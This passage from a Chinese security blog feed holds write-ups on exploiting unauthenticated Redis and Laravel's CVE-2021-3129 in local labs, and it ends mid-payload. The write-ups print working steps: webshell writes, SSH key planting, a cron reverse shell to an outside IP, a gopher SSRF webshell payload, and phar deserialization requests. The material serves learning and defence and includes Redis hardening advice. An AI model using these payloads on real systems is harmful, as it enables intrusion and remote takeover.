    <span class="nv">$phar</span> <span class="o">-&gt;</span> <span class="na">addFromString</span><span class="p">(</span><span class="s1">&#39;test.txt&#39;</span><span class="p">,</span><span class="s1">&#39;test&#39;</span><span class="p">);</span>
    <span class="nv">$phar</span> <span class="o">-&gt;</span> <span class="na">setMetadata</span><span class="p">(</span><span class="nv">$PendingBroadcast</span><span class="p">);</span>
    <span class="nv">$phar</span> <span class="o">-&gt;</span> <span class="na">stopBuffering</span><span class="p">();</span>
    <span class="nx">rename</span><span class="p">(</span><span class="s1">&#39;phar.phar&#39;</span><span class="p">,</span><span class="s1">&#39;phar.jpg&#39;</span><span class="p">);</span>

<span class="p">}</span>
</code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/06/2021-06-16-image-20210616201629961.png" alt="image-20210616201629961"></p>
<p>拿到文件地址，需下载的文件我就直接写在本地了：</p>
<pre><code>phar://./upload/image/202106/3nEb7QNkMnVrxyKtlkrBHMyTSH9slDSL7Nl9hRbL.gif
</code></pre><p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/06/2021-06-16-image-20210616201744680.png" alt="image-20210616201744680"></p>
<p>参考：</p>
<p><a href="https://xz.aliyun.com/t/9555#toc-2">https://xz.aliyun.com/t/9555#toc-2</a></p>
]]></content>
		</item>
		
		<item>
			<title>Redis Unauthorized Access</title>
			<link>https://theoyu.top/posts/redis/</link>
			<pubDate>Tue, 08 Jun 2021 21:20:11 +0800</pubDate>
			
			<guid>https://theoyu.top/posts/redis/</guid>
			<description>0x01 前言 REmote DIctionary Server(Redis) 是完全开源免费的，遵守BSD协议，Redis是一个由Salvatore Sanfilippo写的key-value存储系统。
Redis 与其他它key - value 缓存产品有以下三个特点：
 Redis支持数据的持久化，可以将内存中的数据保存在磁盘中，重启的时候可以再次加载进行使用。 Redis不仅仅支持简单的key-value类型的数据，同时还提供list，set，zset，hash等数据结构的存储。 Redis支持数据的备份，即master-slave模式的数据备份。  Redis因配置不当可造成未授权访问。攻击者无需通过身份认证便可访问到内部数据，造成敏感信息泄露，也可以恶意执行flushall来清空所有数据。如果Redis以root身份运行，可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器。
0x02 部署redis # Download wget http://download.redis.io/releases/redis-stable.tar.gz # Decompression tar -zxvf redis-stable.tar.gz # Compile cd redis-stable make # Run cd src sudo ./redis-server #最新版本redis已经默认启动为普通用户 写ssh公钥和定时计划需root用户 0x03 写 Webshell # kali @ kali in ~/redis-stable/src [9:44:29] $ ./redis-cli127.0.0.1:6379&amp;gt; config set dir /var/www/htmlOK127.0.0.1:6379&amp;gt; config set dbfilename hack.phpOK127.0.0.1:6379&amp;gt; set shell &amp;quot;&amp;lt;?php phpinfo(); ?</description>
			<content type="html"><![CDATA[<h2 id="0x01-前言">0x01 前言</h2>
<p><strong>REmote DIctionary Server</strong>(Redis) 是完全开源免费的，遵守BSD协议，Redis是一个由Salvatore Sanfilippo写的key-value存储系统。</p>
<p>Redis 与其他它key - value 缓存产品有以下三个特点：</p>
<ul>
<li>Redis支持数据的持久化，可以将内存中的数据保存在磁盘中，重启的时候可以再次加载进行使用。</li>
<li>Redis不仅仅支持简单的key-value类型的数据，同时还提供list，set，zset，hash等数据结构的存储。</li>
<li>Redis支持数据的备份，即master-slave模式的数据备份。</li>
</ul>
<p>Redis因配置不当可造成未授权访问。攻击者无需通过身份认证便可访问到内部数据，造成敏感信息泄露，也可以恶意执行flushall来清空所有数据。如果Redis以root身份运行，可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器。</p>
<h2 id="0x02-部署redis">0x02 部署redis</h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># Download</span>
wget http://download.redis.io/releases/redis-stable.tar.gz
<span class="c1"># Decompression</span>
tar -zxvf redis-stable.tar.gz
<span class="c1"># Compile</span>
<span class="nb">cd</span> redis-stable
make
<span class="c1"># Run</span>
<span class="nb">cd</span> src

sudo ./redis-server
<span class="c1">#最新版本redis已经默认启动为普通用户 写ssh公钥和定时计划需root用户</span>
</code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/06/2021-06-08-image-20210608213959530.png" alt="image-20210608213959530"></p>
<h2 id="0x03-写-webshell">0x03 写 Webshell</h2>
<pre><code># kali @ kali in ~/redis-stable/src [9:44:29] 
$ ./redis-cli
127.0.0.1:6379&gt; config set dir /var/www/html
OK
127.0.0.1:6379&gt;  config set dbfilename hack.php
OK
127.0.0.1:6379&gt; set shell &quot;&lt;?php phpinfo(); ?&gt;&quot;
OK
127.0.0.1:6379&gt; save
OK
</code></pre><pre><code># kali @ kali in /var/www/html [9:46:40] 
$ cat hack.php 
REDIS0009�      redis-ver6.0.5�
�edis-bits�@�ctime�ct�`used-mem�5
 aof-preamble���shell&lt;?php phpinfo(); ?&gt;xB?
</code></pre><h2 id="0x04-写入ssh公钥">0x04 写入SSH公钥</h2>
<p>首先我们需要判断redis 服务端是否为root用户启动。如果不是只能在<code>~/.ssh</code>写入(用处比较小)。如果为root权限，我们需要确定<code>/root</code>下是否有<code>.ssh</code>目录，以及<code>etc/ssh/sshd_config </code>下写有<code>PermitRootLogin yes</code>，好在以上两点都可以动过写入计划任务来实现。</p>
<pre><code>flushall
set 1 `\n\n\nyour ssh-rsa public key\n\n\n`
config set dir /root/.ssh/
config set dbfilename authorized_keys
save
</code></pre><h2 id="0x05-crontab-定时任务">0x05 Crontab 定时任务</h2>
<p>这个方法只能<code>Centos</code>上使用，<code>Ubuntu上行不通</code>，原因如下：</p>
<ol>
<li>因为默认redis写文件后是644的权限，但ubuntu要求执行定时任务文件<code>/var/spool/cron/crontabs/&lt;username&gt;</code>权限必须是600也就是<code>-rw-------</code>才会执行，否则会报错<code>(root) INSECURE MODE (mode 0600 expected)</code>，而Centos的定时任务文件<code>/var/spool/cron/&lt;username&gt;</code>权限644也能执行</li>
<li>因为redis保存RDB会存在乱码，在Ubuntu上会报错，而在Centos上不会报错</li>
</ol>
<p>由于系统的不同，crontrab定时文件位置也会不同
Centos的定时任务文件在<code>/var/spool/cron/&lt;username&gt;</code>
Ubuntu定时任务文件在<code>/var/spool/cron/crontabs/&lt;username&gt;</code></p>
<pre><code>127.0.0.1:6379&gt; flushall
OK
127.0.0.1:6379&gt; set 1 '\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/192.168.72.1/12345 0&gt;&amp;1\n\n'
OK
127.0.0.1:6379&gt; config set dir /var/spool/cron/
OK
127.0.0.1:6379&gt; config set dbfilename root
OK
127.0.0.1:6379&gt; save
OK
</code></pre><p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/06/2021-06-08-image-20210608221440872.png" alt="image-20210608221440872"></p>
<h2 id="0x06-redis-rce">0x06 Redis RCE</h2>
<p>留个坑，不是很好理解</p>
<p><a href="https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf">https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf</a></p>
<h2 id="0x07-ssrf与redis">0x07 SSRF与Redis</h2>
<p>首先我们需要知道Redis服务端与客户端的通信方式：</p>
<p><code>Redis</code>服务器与客户端通过<code>RESP</code>（<strong>REdis Serialization Protocol</strong>）协议通信。
RESP协议是在Redis 1.2中引入的，但它成为了与Redis 2.0中的Redis服务器通信的标准方式。这是您应该在Redis客户端中实现的协议。
RESP实际上是一个支持以下数据类型的序列化协议：简单字符串，错误，整数，批量字符串和数组。</p>
<p>RESP在Redis中用作请求 - 响应协议的方式如下：</p>
<ol>
<li>客户端将命令作为<code>Bulk Strings</code>的RESP数组发送到Redis服务器。</li>
<li>服务器根据命令实现回复一种RESP类型。</li>
</ol>
<p>在RESP中，某些数据的类型取决于第一个字节：
对于<code>Simple Strings</code>，回复的第一个字节是<code>+</code>
对于<code>error</code>，回复的第一个字节是<code>-</code>
对于<code>Integer</code>，回复的第一个字节是<code>:</code>
对于<code>Bulk Strings</code>，回复的第一个字节是<code>$</code>
对于<code>array</code>，回复的第一个字节是<code>*</code>
此外，<code>RESP</code>能够使用稍后指定的<code>Bulk Strings</code>或<code>Array</code>的特殊变体来表示<code>Null</code>值。
在RESP中，协议的不同部分始终以<code>&quot;\r\n&quot;(CRLF)</code>结束。</p>
<p>我们通过<strong>wireshake</strong>抓包简单理解以下。</p>
<pre><code>127.0.0.1:6379&gt; set name theoyu
OK
127.0.0.1:6379&gt; get name
&quot;theoyu&quot;
</code></pre><p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/06/2021-06-08-image-20210608223621767.png" alt="image-20210608223621767"></p>
<p><strong>Hex Dump</strong>:</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/06/2021-06-08-image-20210608224917392.png" alt="image-20210608224917392"></p>
<p>正如前面所说，客户端向将命令作为<code>Bulk Strings</code>的RESP数组发送到Redis服务器，比如第一条指令可认作:<code>[&quot;set&quot;,&quot;name&quot;,&quot;theoyu&quot;]</code>,<code>*3</code>表示数组长度为3，<code>$3</code>表示字符串长度，<code>0d0a</code>也就是<code>\r\n</code>为结束符。</p>
<p>ok明白了这些，直接构造命令编码，利用gopher协议即可。</p>
<pre><code>gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2436%0D%0A%0A%0A%3C%3Fphp%20eval%28%24_POST%5B%27theoyu%27%5D%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A
</code></pre><h2 id="0x08-protection">0x08 Protection</h2>
<p>1.禁止外网访问 Redis。修改 redis.conf 文件，添加或修改，使得 Redis 服务只在当前主机可用：</p>
<pre><code>bind 127.0.0.1
</code></pre><p>2.以低权限运行 Redis 服务。</p>
<p>3.Redis 添加密码验证。修改 redis.conf ，添加：</p>
<pre><code>requirepass yourpassword
</code></pre><p>4.禁止一些高危命令。修改 <code>redis.conf</code> 文件，添加如下选项来禁用远程修改 dir/dbfilename。</p>
<pre><code>rename-command FLUSHALL &quot;&quot;
rename-command CONFIG &quot;&quot;
rename-command EVAL &quot;&quot;
</code></pre><p>5.保证 <code>authorized_keys</code> 文件的安全。为保证安全，阻止其他用户添加新的公钥。将 <code>authorized_keys</code> 的权限设置为对拥有者只读，其他用户没有任何权限：</p>
<pre><code>chmod 400 ~/.ssh/authorized_keys
</code></pre><p>为保证 authorized_keys 的权限不会被改掉，还可以设置该文件的 <code>immutable</code> 位权限：</p>
<pre><code>chattr +i ~/.ssh/authorized_keys
</code></pre><p>然而，用户还可以重命名 ~/.ssh，然后新建新的 ~/.ssh 目录和 authorized_keys 文件。要避免这种情况，需要设置 ~./ssh 的 immutable 位权限：</p>
<pre><code>chattr +i ~/.ssh
</code></pre><p><strong>注</strong>：如果需要添加新的公钥，需要移除 authorized_keys 的 immutable 位权限。然后，添加好新的公钥之后，按照上述步骤重新加上 immutable 位权限。</p>
<h2 id="0x09-reference">0x09 Reference</h2>
<p><a href="https://xz.aliyun.com/t/5665">https://xz.aliyun.com/t/5665</a></p>
<p><a href="https://3nd.xyz/2019/11/26/Redis-unauthenticate-exploit.html">https://3nd.xyz/2019/11/26/Redis-unauthenticate-exploit.html</a></p>
<p><a href="https://xz.aliyun.com/t/5616">https://xz.aliyun.com/t/5616</a></p>
]]></content>
		</item>
		
		<item>
			<title>Laravel Debug mode RCE</title>
			<link>https://theoyu.top/posts/laravelrce/</link>
			<pubDate>Tue, 01 Jun 2021 22:24:32 +0800</pubDate>
			
			<guid>https://theoyu.top/posts/laravelrce/</guid>
			<description>0x01 前言 Laravel是一套简洁、开源的PHP Web开发框架，旨在实现Web软件的MVC架构。
2021年01月12日，Laravel被披露存在一个远程代码执行漏洞（CVE-2021-3129）。
当Laravel开启了Debug模式时，由于Laravel自带的Ignition 组件对file_get_contents()和file_put_contents()函数的不安全使用，攻击者可以通过发起恶意请求，构造恶意Log文件等方式触发Phar反序列化，最终造成远程代码执行。
已经有很多师傅们复现过这个CVE，本文也只是跟着过一遍，最后简单谈一谈利用ftp被动模式攻击php-fpm的方法。
0x02 环境准备 利用github上已配置好环境 https://github.com/SNCKER/CVE-2021-3129
自己搭建 因为在容器里的话不是很方便我们提示和观测结果，最后我选择了本地直接安装(Windows)
git clone https://github.com/laravel/laravel.git cd laravel git checkout e849812 # 切换到存在漏洞的分支 composer install # 安装依赖 composer require facade/ignition==2.5.1 # 下载安装存在漏洞版本的组件 php artisan serve # 启动服务器 搭建完成后，打开配置文件 laravel/config/app.php，找到 ‘debug’项设置为true（开启debug模式）：
之后访问http://localhost:8000,会抛出以下运行异常：No application encryption key has been specified.（未指定应用程序的APP_KEY加密密钥）：
可以看到这时候 Ignition（Laravel 6+默认错误页面生成器）给我们提供了一个solutions，让我们在配置文件中给Laravel配置一个加密APP_KEY。
我们进入laravel根目录，将根目录里的”.env.example”重命名”.env”,然后点击“Generate app key”按钮后会发送一个请求：
可以看到Ignition 成功在配置文件.env中生成了一个key，而这也就是我们今天要注意的漏洞关键点。
0x03 log写入phar触发反序列化 正如上面所说，debug模式中ignition附带了“一键修复bug”的功能,本次laravel这个漏洞其实就是发生在上面提到的 Ignition（&amp;lt;=2.5.1）中，本次漏洞就是其中的vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php中的参数过滤不严谨导致的。
可以看到这里主要功能点是：读取一个给定的路径，并替换$variableName为$variableName ?? &#39;&#39;，之后写回文件中。 由于这里调用了file_get_contents()，且其中的参数可控，所以这里可以通过phar://协议去触发phar反序列化。
我们可以发以下数据包检测是否存在漏洞( 可用作fofa批量搜寻漏洞)
POST /_ignition/execute-solution HTTP/1.1 Host: 127.</description>
			<content type="html"><![CDATA[<h2 id="0x01-前言">0x01 前言</h2>
<p>Laravel是一套简洁、开源的PHP Web开发框架，旨在实现Web软件的MVC架构。</p>
<p>2021年01月12日，Laravel被披露存在一个远程代码执行漏洞（CVE-2021-3129）。</p>
<p>当Laravel开启了Debug模式时，由于Laravel自带的Ignition  组件对file_get_contents()和file_put_contents()函数的不安全使用，攻击者可以通过发起恶意请求，构造恶意Log文件等方式触发Phar反序列化，最终造成远程代码执行。</p>
<p>已经有很多师傅们复现过这个CVE，本文也只是跟着过一遍，最后简单谈一谈利用ftp被动模式攻击php-fpm的方法。</p>
<h2 id="0x02-环境准备">0x02 环境准备</h2>
<h3 id="利用github上已配置好环境">利用github上已配置好环境</h3>
<p><a href="https://github.com/SNCKER/CVE-2021-3129">https://github.com/SNCKER/CVE-2021-3129</a></p>
<h3 id="自己搭建">自己搭建</h3>
<p>因为在容器里的话不是很方便我们提示和观测结果，最后我选择了本地直接安装(Windows)</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">git clone https://github.com/laravel/laravel.git    
<span class="nb">cd</span> laravel
git checkout e849812    <span class="c1"># 切换到存在漏洞的分支</span>
composer install        <span class="c1"># 安装依赖</span>
composer require facade/ignition<span class="o">==</span>2.5.1    <span class="c1"># 下载安装存在漏洞版本的组件</span>
php artisan serve   <span class="c1"># 启动服务器</span>
</code></pre></div><p>搭建完成后，打开配置文件 laravel/config/app.php，找到 ‘debug’项设置为true（开启debug模式）：</p>
<p>之后访问<code>http://localhost:8000,</code>会抛出以下运行异常：No application encryption key has been specified.（未指定应用程序的APP_KEY加密密钥）：</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/06/2021-06-01-image-20210601233635369.png" alt="image-20210601233635369"></p>
<p>可以看到这时候 <code>Ignition</code>（Laravel 6+默认错误页面生成器）给我们提供了一个solutions，让我们在配置文件中给Laravel配置一个加密APP_KEY。</p>
<p>我们进入laravel根目录，将根目录里的”.env.example”重命名”.env”,然后点击“Generate app key”按钮后会发送一个请求：</p>
<p>可以看到<code>Ignition</code> 成功在配置文件.env中生成了一个key，而这也就是我们今天要注意的漏洞关键点。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/06/2021-06-01-image-20210601234219611.png" alt="image-20210601234219611"></p>
<h2 id="0x03-log写入phar触发反序列化">0x03 log写入phar触发反序列化</h2>
<p>正如上面所说，debug模式中<code>ignition</code>附带了“一键修复bug”的功能,本次laravel这个漏洞其实就是发生在上面提到的 <code>Ignition</code>（&lt;=2.5.1）中，本次漏洞就是其中的<code>vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php</code>中的参数过滤不严谨导致的。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/06/2021-06-02-image-20210602213821629.png" alt="image-20210602213821629"></p>
<p>可以看到这里主要功能点是：读取一个给定的路径，并替换<code>$variableName</code>为<code>$variableName ?? ''</code>，之后写回文件中。
由于这里调用了<code>file_get_contents()</code>，且其中的参数可控，所以这里可以通过<code>phar://</code>协议去触发phar反序列化。</p>
<p>我们可以发以下数据包检测是否存在漏洞( 可用作fofa批量搜寻漏洞)</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="err">POST</span> <span class="err">/_ignition/execute-solution</span> <span class="err">HTTP/</span><span class="mf">1.1</span>
<span class="err">Host:</span> <span class="mf">127.0</span><span class="err">.</span><span class="mf">0.1</span><span class="err">:</span><span class="mi">8000</span>
<span class="err">Content-Type:</span> <span class="err">application/json</span>
<span class="err">Connection:</span> <span class="err">close</span>
<span class="err">Content-Length:</span> <span class="mi">166</span>

<span class="p">{</span>
  <span class="nt">&#34;solution&#34;</span><span class="p">:</span> <span class="s2">&#34;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&#34;</span><span class="p">,</span>
  <span class="nt">&#34;parameters&#34;</span><span class="p">:</span> <span class="p">{</span>
    <span class="nt">&#34;variableName&#34;</span><span class="p">:</span> <span class="s2">&#34;theoyu&#34;</span><span class="p">,</span>
    <span class="nt">&#34;viewFile&#34;</span><span class="p">:</span> <span class="s2">&#34;xxxxxxx&#34;</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/06/2021-06-02-image-20210601235046916.png" alt="image-20210601235046916"></p>
<p>可以看到有报错，说明漏洞存在，我们现在开始复现。</p>
<p>我们假设后期二次开发人员写了一共文件上传功能，那我们可以传一个恶意<code>phar</code>文件，再利用<code>file_get_contents()</code>进行反序列化。</p>
<p>这里我们从<strong>phpggc</strong>拿一条链子(好像laravel5的几个链也可以)</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">php -d<span class="s1">&#39;phar.readonly=0&#39;</span> ./phpggc monolog/rce1 system whoami --phar phar -o phar.phar
</code></pre></div><p>将其放入laravel下。</p>
<p>利用上述<code>file_get_contents()</code>触发。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="err">POST</span> <span class="err">/_ignition/execute-solution</span> <span class="err">HTTP/</span><span class="mf">1.1</span>
<span class="err">Host:</span> <span class="mf">127.0</span><span class="err">.</span><span class="mf">0.1</span><span class="err">:</span><span class="mi">8000</span>
<span class="err">Content-Type:</span> <span class="err">application/json</span>
<span class="err">Connection:</span> <span class="err">close</span>
<span class="err">Content-Length:</span> <span class="mi">222</span>

<span class="p">{</span>
  <span class="nt">&#34;solution&#34;</span><span class="p">:</span> <span class="s2">&#34;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&#34;</span><span class="p">,</span>
  <span class="nt">&#34;parameters&#34;</span><span class="p">:</span> <span class="p">{</span>
    <span class="nt">&#34;variableName&#34;</span><span class="p">:</span> <span class="s2">&#34;theoyu&#34;</span><span class="p">,</span>
    <span class="nt">&#34;viewFile&#34;</span><span class="p">:</span> <span class="s2">&#34;phar:///phpStudy/PHPTutorial/WWW/cms/laravel/phar.phar/test.txt&#34;</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/06/2021-06-02-image-20210602002805556.png" alt="image-20210602002805556"></p>
<p>可以看到达到了RCE的效果。</p>
<p>本次的重点在于，<code>/storage/logs/laravel.log</code>文件具有可写入权限，我们可以利用伪协议清空日志，并构造出<code>phar</code>文件格式。</p>
<p>清空payload：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="err">POST</span> <span class="err">/_ignition/execute-solution</span> <span class="err">HTTP/</span><span class="mf">1.1</span>
<span class="err">Host:</span> <span class="mf">127.0</span><span class="err">.</span><span class="mf">0.1</span><span class="err">:</span><span class="mi">8000</span>
<span class="err">Content-Type:</span> <span class="err">application/json</span>
<span class="err">Connection:</span> <span class="err">close</span>
<span class="err">Content-Length:</span> <span class="mi">326</span>

<span class="p">{</span>
  <span class="nt">&#34;solution&#34;</span><span class="p">:</span> <span class="s2">&#34;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&#34;</span><span class="p">,</span>
  <span class="nt">&#34;parameters&#34;</span><span class="p">:</span> <span class="p">{</span>
    <span class="nt">&#34;variableName&#34;</span><span class="p">:</span> <span class="s2">&#34;theoyu&#34;</span><span class="p">,</span>
    <span class="nt">&#34;viewFile&#34;</span><span class="p">:</span> <span class="s2">&#34;php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&#34;</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div><p>关键在于：<code>convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode</code>,这里可以看出一共有4步。</p>
<ul>
<li>
<p><code>convert.iconv.utf-8.utf-16be</code>(UTF-8 -&gt; UTF-16BE)</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/06/2021-06-02-image-20210602220211795.png" alt="image-20210602220211795"></p>
</li>
<li>
<p><code>convert.quoted-printable-encode</code>(打印所有不可见字符)</p>
</li>
<li>
<p><code>convert.iconv.utf-16be.utf-8</code>(UTF-16BE -&gt; UTF-8)</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/06/2021-06-02-image-20210602220559581.png" alt="image-20210602220559581"></p>
<p>可以看到经过这样操作后log文件中所有字符变成了非base64字符，这时候再使用<code>convert.base64-decode</code>过滤器就可以成功清空了。</p>
</li>
</ul>
<p>接下来我们需要把payload写入log文件。</p>
<p>我们的确可以直接写入，但我们得确保其他不需要的内容应该删除，同理我们也应该做一些处理：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"> php -d<span class="s1">&#39;phar.readonly=0&#39;</span> ./phpggc monolog/rce1 system whoami --phar phar -o php://output <span class="p">|</span> base64 -w <span class="m">0</span> <span class="p">|</span> python -c <span class="s2">&#34;import sys;print(&#39;&#39;.join([&#39;=&#39; + hex(ord(i))[2:] + &#39;=00&#39; for i in sys.stdin.read()]).upper())&#34;</span>
</code></pre></div><p>这里生成的结果是奇数，<code>convert.quoted-printable-decode</code>要求是偶数，我们可以往前面或者后面随意添加1个字符，然后写入。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="err">POST</span> <span class="err">/_ignition/execute-solution</span> <span class="err">HTTP/</span><span class="mf">1.1</span>
<span class="err">Host:</span> <span class="mf">127.0</span><span class="err">.</span><span class="mf">0.1</span><span class="err">:</span><span class="mi">8000</span>
<span class="err">Content-Type:</span> <span class="err">application/json</span>
<span class="err">Connection:</span> <span class="err">close</span>
<span class="err">Content-Length:</span> <span class="mi">326</span>

<span class="p">{</span>
  <span class="nt">&#34;solution&#34;</span><span class="p">:</span> <span class="s2">&#34;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&#34;</span><span class="p">,</span>
  <span class="nt">&#34;parameters&#34;</span><span class="p">:</span> <span class="p">{</span>
    <span class="nt">&#34;variableName&#34;</span><span class="p">:</span> <span class="s2">&#34;theoyu&#34;</span><span class="p">,</span>
    <span class="nt">&#34;viewFile&#34;</span><span class="p">:</span> <span class="s2">&#34;=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=58=00=31=00=39=00=49=00=51=00=55=00=78=00=55=00=58=00=30=00=4E=00=50=00=54=00=56=00=42=00=4A=00=54=00=45=00=56=00=53=00=4B=00=43=00=6B=00=37=00=49=00=44=00=38=00=2B=00=44=00=51=00=72=00=46=00=41=00=67=00=41=00=41=00=41=00=67=00=41=00=41=00=41=00=42=00=45=00=41=00=41=00=41=00=41=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=42=00=75=00=41=00=67=00=41=00=41=00=54=00=7A=00=6F=00=7A=00=4D=00=6A=00=6F=00=69=00=54=00=57=00=39=00=75=00=62=00=32=00=78=00=76=00=5A=00=31=00=78=00=49=00=59=00=57=00=35=00=6B=00=62=00=47=00=56=00=79=00=58=00=46=00=4E=00=35=00=63=00=32=00=78=00=76=00=5A=00=31=00=56=00=6B=00=63=00=45=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=45=00=36=00=65=00=33=00=4D=00=36=00=4F=00=54=00=6F=00=69=00=41=00=43=00=6F=00=41=00=63=00=32=00=39=00=6A=00=61=00=32=00=56=00=30=00=49=00=6A=00=74=00=50=00=4F=00=6A=00=49=00=35=00=4F=00=69=00=4A=00=4E=00=62=00=32=00=35=00=76=00=62=00=47=00=39=00=6E=00=58=00=45=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=4A=00=63=00=51=00=6E=00=56=00=6D=00=5A=00=6D=00=56=00=79=00=53=00=47=00=46=00=75=00=5A=00=47=00=78=00=6C=00=63=00=69=00=49=00=36=00=4E=00=7A=00=70=00=37=00=63=00=7A=00=6F=00=78=00=4D=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=61=00=47=00=46=00=75=00=5A=00=47=00=78=00=6C=00=63=00=69=00=49=00=37=00=54=00=7A=00=6F=00=79=00=4F=00=54=00=6F=00=69=00=54=00=57=00=39=00=75=00=62=00=32=00=78=00=76=00=5A=00=31=00=78=00=49=00=59=00=57=00=35=00=6B=00=62=00=47=00=56=00=79=00=58=00=45=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=6B=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=63=00=36=00=65=00=33=00=4D=00=36=00=4D=00=54=00=41=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=49=00=69=00=4F=00=30=00=34=00=37=00=63=00=7A=00=6F=00=78=00=4D=00=7A=00=6F=00=69=00=41=00=43=00=6F=00=41=00=59=00=6E=00=56=00=6D=00=5A=00=6D=00=56=00=79=00=55=00=32=00=6C=00=36=00=5A=00=53=00=49=00=37=00=61=00=54=00=6F=00=74=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=6B=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=69=00=49=00=37=00=59=00=54=00=6F=00=78=00=4F=00=6E=00=74=00=70=00=4F=00=6A=00=41=00=37=00=59=00=54=00=6F=00=79=00=4F=00=6E=00=74=00=70=00=4F=00=6A=00=41=00=37=00=63=00=7A=00=6F=00=32=00=4F=00=69=00=4A=00=33=00=61=00=47=00=39=00=68=00=62=00=57=00=6B=00=69=00=4F=00=33=00=4D=00=36=00=4E=00=54=00=6F=00=69=00=62=00=47=00=56=00=32=00=5A=00=57=00=77=00=69=00=4F=00=30=00=34=00=37=00=66=00=58=00=31=00=7A=00=4F=00=6A=00=67=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=78=00=6C=00=64=00=6D=00=56=00=73=00=49=00=6A=00=74=00=4F=00=4F=00=33=00=4D=00=36=00=4D=00=54=00=51=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=6C=00=75=00=61=00=58=00=52=00=70=00=59=00=57=00=78=00=70=00=65=00=6D=00=56=00=6B=00=49=00=6A=00=74=00=69=00=4F=00=6A=00=45=00=37=00=63=00=7A=00=6F=00=78=00=4E=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=59=00=6E=00=56=00=6D=00=5A=00=6D=00=56=00=79=00=54=00=47=00=6C=00=74=00=61=00=58=00=51=00=69=00=4F=00=32=00=6B=00=36=00=4C=00=54=00=45=00=37=00=63=00=7A=00=6F=00=78=00=4D=00=7A=00=6F=00=69=00=41=00=43=00=6F=00=41=00=63=00=48=00=4A=00=76=00=59=00=32=00=56=00=7A=00=63=00=32=00=39=00=79=00=63=00=79=00=49=00=37=00=59=00=54=00=6F=00=79=00=4F=00=6E=00=74=00=70=00=4F=00=6A=00=41=00=37=00=63=00=7A=00=6F=00=33=00=4F=00=69=00=4A=00=6A=00=64=00=58=00=4A=00=79=00=5A=00=57=00=35=00=30=00=49=00=6A=00=74=00=70=00=4F=00=6A=00=45=00=37=00=63=00=7A=00=6F=00=32=00=4F=00=69=00=4A=00=7A=00=65=00=58=00=4E=00=30=00=5A=00=57=00=30=00=69=00=4F=00=33=00=31=00=39=00=63=00